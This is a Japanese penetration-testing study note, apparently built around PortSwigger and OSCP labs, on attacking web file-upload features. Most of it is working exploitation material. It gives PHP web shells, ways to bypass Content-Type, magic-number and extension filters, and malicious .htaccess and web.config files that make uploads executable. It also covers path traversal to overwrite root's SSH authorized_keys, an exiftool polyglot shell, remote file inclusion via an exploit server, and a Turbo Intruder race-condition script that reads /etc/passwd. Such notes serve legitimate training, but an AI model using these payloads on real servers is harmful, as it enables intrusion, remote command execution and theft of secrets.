# 注目ポイント

- File upload機能
	- Avatar:等

- 💡ファイルが2回アップロードされたときに何が起こるかを**必ず**確認すること。
	- もしファイルが既に存在することを示せば、この方法を用いてWebサーバの内容をブルートフォースできる。
	- もしエラーメッセージを表示すれば、使用されているテクノロジースタックがわかる。

---

# ファイルアップロードに関するテスト手順

## 1. Webサイトの技術スタックを調査

- [2. フィルタリングの種類とバイパス](2.%20フィルタリングの種類とバイパス.md#Enumeration)
- Wappalyzerを使用する（ただし、精度は100%ではない）。
- Burp Suiteを用いてレスポンスヘッダーの`server`や`x-powered-by`を確認。
- 攻撃の足がかりとなりそうなアップロードページを特定。
- [Gobuster](obsidian://open?vault=OSCP&file=TryHackME%2FTool%2F%F0%9F%91%BBGobuster)でアップロードファイルの保存先を特定。
- 使用されている言語が判明したら、[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)から対応するリバースシェルのペイロードを準備。

## 2. アップロードページの調査

- クライアントサイドでのフィルタリングがあるか確認（例：JavaScriptでの拡張子制限）。
- Webページのソースコードを確認し、アップロードファイルの格納先パスが記載されていないか調査。

## 3. 正規の無害なファイルをアップロード

- アップロード後、ファイルの配置場所やアクセス方法を確認。
    - 直接URLでアクセス可能か？
    - 別のページに埋め込まれているか？
    - 命名規則にパターンはあるか？

- 配置場所が不明な場合、Gobusterを使用してディレクトリ探索。
```zsh
gobuster dir -u http://<TargetIP>/ -w wordlist.txt
```
    
- 配置場所を特定したら、以下のコマンドでファイル構成を調査
```zsh
gobuster dir -u http://<TargetIP>/<path> -x .<拡張子>
```
    
- **この時点のファイル構成を記録しておく**（シェルをアップロード後に名前が変更される可能性があるため、比較用にメモ）。

## 4. クライアントサイドフィルタのバイパス

- Burp Suiteを使用し、リクエストをキャプチャ
- JavaScriptによる拡張子チェックなどがあれば該当コードを削除してリクエストを送信

## 5. 悪意のあるファイルのアップロードを試行

- ステップ４でうまくいかず、サーバー側のフィルタリングでブロックされた場合、エラーメッセージを確認し、次の手法を決定
- フィルタリングの種類を特定し、バイパスする

### 拡張子フィルタ

#### 特定

- 適当な拡張子（例：`images.aiueo`）で試し、
	- 成功 → ブラックリスト方式
	- 失敗 → ホワイトリスト方式

#### エクスプロイト

- ブラックリスト方式
	- [⚡️File upload vuln](#ファイル拡張子の難読化によるバイパス)

- ホワイトリスト方式
	- [⚡️File upload vuln](#サーバ設定の上書きによるバイパス)
	- [⚡️File upload vuln](#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践)
	- [⚡️File upload vuln](#Content-Typeフィルタバイパス実践)

### Magic Number フィルタ

#### 特定

- 一度通過した無害なファイルのMagic Numberを変更して再アップロード。
- ブロックされた場合、Magic Number チェックが適用されている。
- Hexエディタで編集し、異なるバイト列で試行。

#### エクスプロイト

1. どのファイル拡張子がフィルタを通過するか確かめる。
2. [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)　に、拡張子ごとのマジックナンバー("Hex signature")が載っている。ステップ1でフィルタをパスしたファイル拡張子のhexをメモしておく
3. 悪意あるファイルのファイルタイプを確認する
```zsh
file exploit.php
# php
```

4. シェルのファイルの先頭に適当な文字を入れてセーブ(AAAAとか)
```php
AAAA
<?php echo system($_GET["cmd"]); ?>
```

5. 以下のコマンドで先頭のmagic numberを編集しする(41 = A)
```zsh
hexeditor [file]
```
![[Pasted image 20250329171111.png]]

6. もう一度、ファイルタイプを閲覧し、変更されていることを確認する
```zsh
file exploit.php
# jpeg
```

7. 上記のファイルをアップロードする

もしくは、[⚡️File upload vuln](#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践)

### MIME タイプフィルタ

#### 特定

- 無害なファイルのアップロード時にBurp Suiteで`Content-Type`を変更。
- ブロックされた場合、MIMEタイプでのフィルタリングが適用されている。

#### エクスプロイト

- [⚡️File upload vuln](#Content-Typeフィルタバイパス実践)

### ファイルサイズフィルタ

#### 特定

- 小さいファイルから徐々にサイズを大きくし、許容される最大値を特定。
- エラーメッセージからサイズ制限を推測可能な場合もある。
- サイズ制限が厳しいとリバースシェルのアップロードが困難になる可能性があるため、別の方法を検討。

#### エクスプロイト

- [Tiny-PHP-Webshell](https://github.com/bayufedra/Tiny-PHP-Webshell)などを使用

---

# Content-Type制限

## 基本

- システムの仕様：Content-Typeヘッダ ＝ 事前設定のMIMEタイプ
- 暗黙的にContent-Typeヘッダの値を信頼してしまうサーバの脆弱性を突く

## Content-Typeフィルタバイパス実践

1. Web Shellをアップロードする(`exploit.php`)
```php
<?php system($_GET['cmd']); ?>
```

2. ファイルアップロードのPOSTリクエストをRepeaterへ送り、`Content-Type`ヘッダの値を許可された値に変更してSend。↓例
```http
Content-Type: application/x-php
	↓
Content-Type: image/jpeg
```

3. アップロードしたファイルにアクセスし、任意のコマンドを実行する
```http
GET /files/uploaded/path/exploit.php?cmd=[ShellCommand]
```

---

# & Path traversal

## 基本

- 1段階目の防衛策は[⚡️File upload vuln](#Content-Type制限)
- 2段階目：Content-Type制限が突破されても、スクリプトを実行させないようにする
- [1. File upload脆弱性の基本と対策](1.%20File%20upload脆弱性の基本と対策.md#事前知識：サーバは静的なファイルをどう処理するのか)の3にあるように、 executable + サーバがファイルを実行しない設定 → エラー or Plain text
	- つまり、実行可能ファイルをアップロードできない場合にトライする。

- plain textで返された場合の挙動
```http
GET /static/exploit.php?command=id
HTTP/1.1 Host: normal-website.com
...
```
```http
HTTP/1.1 200 OK 
Content-Type: text/plain 
Content-Length: 39 

<?php echo system($_GET['command']); ?>
```
- [1. 情報開示の基本と対策](../../../BSCP/Server-side/Information%20disclosure/1.%20情報開示の基本と対策.md)へとつながるかもだが、Web shellは難しくなる

### 特定ディレクトリの実行制限バイパス概要

- 開発者が==ユーザはアクセスしないだろうと想定しているディレクトリに、ファイルをアップロードする==方法を見つける
	- ディレクトリによって制限が異なる可能性が高い。ユーザが普通にアクセスするディレクトリは制限が厳しい

### Tips

- サーバは`multipart/form-data`リクエストの`filename`フィールドの値から、ファイル名と保存場所を決定することが多い。
- 静的なファイルディレクトリ(imagesなど)にWeb shellをアップロードすることも一つの手段
	- 例えばWebアプリに画像が添付されており、そのURLが`http://example.com/images/product/123.png`だとする
	- `http://example.com/expected/path/../../images/product/shell.php`とする

## 親ディレクトリに保存されるようにパストラバーサル

1.  multipart/form-data の `filename=`パラメタの値をTraversal Sequenceを使用し操作する
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
	↓
```http
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. アップロードしたファイルを開く
	- そのまま開くと`http://TARGET_NET/files/avatars/..%2Fshell.php`となり、Not Foundとなるので、トラバーサルシーケンスで移動したディレクトリ上でファイルを開く
	- 例えば、`http://TARGET_NET/files/shell.php`を開くとWeb shellを実行できるようになる
	- ファイルパスは正規の拡張子ファイルをアップロードすることでわかることがある

- 必要に応じて[Path traversal](../../../BSCP/Server-side/Path%20traversal/Path%20traversal.md#サニタイジング等の防御を突破する方法)を使用する

## 応用：rootユーザーのSSHのauthorized_keys上書き

⚠️：多くのrootユーザーにはSSHアクセス権限はない。NmapでSSHサービスが有効であるならトライする。

1. [OSCP vault : SSH](obsidian://open?vault=OSCP&file=Cheatsheet%2FPorts%20-%20Service%2F22%20-%20SSH)に従い、秘密鍵・公開鍵のペアを生成し、生成した公開鍵を`authorized_keys`という名前に編集
2. `authorized_keys`をアップロードする
```
../../../../../../../root/.ssh/authorized_keys
```
![[Pasted image 20250330101314.png]]

3. rootユーザーでSSHアクセス
```zsh
ssh -i [secret key file] -p [port] root@[IP|Domain]
```

---

# 悪意あるファイルへの不十分なブラックリスト

## サーバ設定の上書きによるバイパス

### 基本

- サーバは個々のディレクトリごとにグローバル設定を上書きしたり追加することが可能

- 大前提：サーバはファイルを実行する設定がないとファイルを実行しない
- 用途：ファイルがホワイトリスト形式のとき
- シチュエーション：ブラックリストの場合で、`shell.hogehoge`のようなファイルでもアップロードできるとき

### Apacheの場合

- `.htaccess`ファイルでディレクトリごとにグローバル設定を上書きした固有の設定が可能
- 以下は`.php`ファイルの実行が可能になる設定
```zsh
# 基本文法は`Add Type <MIME-type> <file-extension>`
AddType application/x-httpd-php .php
```
- phpがブラックリストでアップロードできない場合、uploadフォームに、任意の拡張子をphpとして読み込む設定を入れた`.htaccess`をアップロードし、phpのペイロードを注入できることがある
```zsh
echo  "AddType application/x-httpd-php .<tty等、任意の拡張子>" > .htaccess
# .htaccessをアップロードする
# shell.tty（中身はphp）をアップロードする
```

- 🚨大前提として、PHPファイルを実行するにはグローバル設定(※)に以下の記述がないといけない（※：`/etc/apache2/apache2.conf` or `httpd.conf`）
```apache
LoadModule php_module /usr/lib/apache2/modules/libphp.so
```

---

### サーバ設定の上書き実践

1. システムのサーバを識別する
	- レスポンスヘッダ`Server: Apache/2.4.29 (Ubuntu)`などの形式で記載

2. ブラックリストを回避するために、任意の拡張子が実行可能なMIMEタイプ(.php)とする設定ファイルを作成する
- Apacheの場合：`.htaccess`
```
AddType application/x-httpd-php .hogehoge
```

3. ステップ2で作成した悪意ある設定ファイルをアップロードし、設定ファイルを上書きする(⚠️: Finderで`.`から始まるファイルを表示するにはCmd+Shift+`.`ボタン)
- レスポンス
```
The file avatars/.htaccess has been uploaded
```

4. Web shell(`shell.hogehoge`)をアップロードし、アップロード先のファイルパスで結果を確認する
```hogehoge
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

[LAB: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

### IIS + web.config による攻撃手法

- `web.config`ファイルでディレクトリごとにグローバル設定を上書きした固有の設定が可能
- PHPがブラックリストでアップロードできない場合、任意の拡張子をPHP/ASPとして実行する設定を`web.config`に記述してアップロード

PHPの場合
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_jpg" 
                 path="*.jpg" 
                 verb="*" 
                 modules="FastCgiModule" 
                 scriptProcessor="C:\PHP\php-cgi.exe" 
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

ASPの場合
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="cmd" path="*.jpg" verb="*" modules="IsapiModule"
           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
           resourceType="File"/>
    </handlers>
  </system.webServer>
</configuration>
```

#### web.configによる実行可能拡張子変更攻撃

1. web.configを作成（.jpg拡張子をPHP実行可能にする設定）
```powershell
echo '<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers><add name="PHP_jpg" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" /></handlers></system.webServer></configuration>' > web.config
```

2. web.configをアップロード

3. shell.jpg（中身はPHPコード）をアップロード
```powershell
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
#  アップロード
```

4. アップロード先にアクセス
```
http://<TargetIP>/<path>/shell.jpg?cmd=whoami
```

- 🚨大前提としてIISでPHPファイルを実行するには、**グローバル設定**で以下が必要：
	- PHP（CGI版）がインストール済み（`C:\PHP\php-cgi.exe`）
	- FastCGI モジュールが有効（IISマネージャーで確認：Server → Modules → FastCgiModule）
    - applicationHost.config に基本設定がある（`C:\Windows\System32\inoteserv\config\applicationHost.config`）
```xml
   <fastCgi>
       <application fullPath="C:\PHP\php-cgi.exe" />
   </fastCgi>
```

---

# ファイル拡張子の難読化によるバイパス

- [HackTricks: Bypass file extensions check](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks)をファイル名ごと総当たり
- うまくいったリクエストでファイル名を実際のファイル名に変更する
- 用途：ファイルがブラックリストのとき
	- 💡これでうまくいかないときは[⚡️File upload vuln](#悪意あるファイルへの不十分なブラックリスト)を試す

## ブラックリスト回避テクニック
### 汎用 (`a.xxx`)

- `a.Xxx`
- `a.xxx.` (保存前にサーバーサイド処理で末尾の` . `がstripされるの狙い)
- `a.xxx.jpg` (保存時にはjpg、読み取り時には .xxx 扱いされるの狙い)
	- `a.xxx%00.jpg` (同上)
	- `a.xxx;.jpg` (同上)

- `a%2Exxx` (URLデコードで`%2E` -> ` . `にされるの狙い)
- `a\xC0\x2Exxx` (UTF-8 -> ASCII変換時に`.`やNULLにされるの狙い)
- `a.x.xxxxx` (`.xxx` を空文字列に変換させる処理狙い)
![[Pasted image 20240215090430.png]]

### .php

- `.php5`
- `.shtml`

---

# fileコンテンツ検証バイパス w/ Exiftool

## コンテンツ検証の回避概要

- *ExifTool*を使用し、メタデータ内に悪意のあるコードを含むポリグロットJPEGファイルを作成する
	- [📕](../../../BSCP/Misc/📕.md#ポリグロット(polyglot)) [📕](../../../BSCP/Misc/📕.md#メタデータ)

## polyglot作成によるコンテンツ検証の回避実践

- polyglotなJPGを作成し、拡張子がphpのファイルに記述する
```zsh
exiftool -Comment="<?php echo system($_GET['cmd']); ?>" image.jpg -o polyglot.php
```

- ⚠️拡張子がphp系じゃないとWeb shell実行不可
- 拡張子が`.php`でもMIMEタイプはJPGのまま。

---

# RFI(remote file inclusion)

1. エクスプロイトサーバに以下をホストする
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. 被害アプリに悪意あるシェルスクリプトを保存したエクスプロイトサーバへのURLを指定する。
```
https://EXPLOIT_DOMAIN/shell.php#hoge.jpg
```
- [2.  一般的なSSRF防御の回避](../../../BSCP/Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)

---

# Expert: Race conditionの悪用

## 基本

- どれだけ堅牢だとしても、開発者が独自のファイルアップロードシステムを開発し利用すると起きる可能性のある攻撃
- しかし、ソースコードをリークしないとほぼ見つけられない脆弱性。ブラックボックステストではほぼ無理

## 近年のフレームワークによるfile upload脆弱性への対策

- 上に述べてきた対策はもちろん行う
- + サンドボックス化された一時的なディレクトリにアップロードする
- + 上書きを避けるためにファイル名をランダム化
- + サンドボックスで検証し、安全だと判断できた場合のみ本番ディレクトリにアップロードする

## 独自のファイルアップロードシステムの場合の脆弱性の原理

- ファイルを本番ディレクトリに直接アップロードしてからAVソフトによりバリデーションを行い、問題があれば削除する。
- バリデーションが数ミリ秒の時間しかかからなくても、ファイルがサーバに存在する僅かな時間で悪用が可能である。

## race conditionの悪用実践

### Turbo Intruderで複数種のリクエストを送る

- 以下はファイルアップロードのPOSTとweb shellのGETコマンド

1. Web shellファイルアップロードのPOSTリクエストをRepeater-> Turbo Intruderへ

2. 以下のスクリプトをTurbo Intruderのpythonエディタにコピペする
```python
def queueRequests(target, wordlists): 
	engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) 
	
	request1 = '''<YOUR-POST-REQUEST>''' 
	
	request2 = '''<YOUR-GET-REQUEST>''' 
	
	# the 'gate' argument blocks the final byte of each request until openGate is invoked 
	engine.queue(request1, gate='race1') 
	for x in range(5): 
		engine.queue(request2, gate='race1') 
		
	# wait until every 'race1' tagged request is ready 
	# then send the final byte of each request 
	# (this method is non-blocking, just like queue) 
	engine.openGate('race1') 
	
	engine.complete(timeout=60) 
	
def handleResponse(req, interesting): 
	table.add(req)
```
- 1つのPOSTリクエスト(`request1`)を送ったあと、即座に5つのGETリクエストを送る。

3. `'''<YOUR-POST-REQUEST>'''`をファイルアップロードのPOSTリクエスト「全文」でリプレイスする
	- ＊該当POSTリクエストはweb shellをアップロードしたものであること

4. `'''<YOUR-GET-REQUEST>'''`を意図するGETリクエスト「全文」でリプレイスする
```http
GET /file/shell.php?cmd=cat+/etc/passwd
...
```
- **注意**：GETリクエストは最後の空白行も意味のある行(ヘッダセクションの終を意味する）。削除しないこと。
![[Pasted image 20231204111231.png | 300]]
- あらかじめアップロードしたファイルのアップロード先を明らかにしておく必要がある

### URLを指定してファイルをアップロードする場合のrace conditionエクスプロイト概要

#### 脆弱性の原理

- ファイルはURLを指定しHTTPでアップロードするとき
- HTTPでアップロードするので、==ファイルアップロードのためのフレームワークが使用不可==
- サーバはURLからファイルを取得し、検証前にローカルコピーを作成する。
- サーバはPHPの`uniqid()`関数などを使用し、ランダム化された名前のディレクトリにローカルコピーを保存する
	- 🚨： 関数にはブルートフォースされる可能性がある

#### Race condition in URL-based file uploads 方法概要

1. デカいサイズのファイルをアップロードする
	- これにより、ブルートフォースする時間を稼ぐ

2.  ファイルアップロード先のディレクトリをブルートフォースする。
	- 関数の特徴(生成するlengthなど)を把握したpayloadを使う

OR

1. デカいサイズのファイルで、先頭にpayloadを加え、続けて大量のパディングバイトを付与するだけ
```php
<?php system($_GET['cmd']); ?>[大量のパディングバイト]
```
- チャンクで処理されているときに使える方法。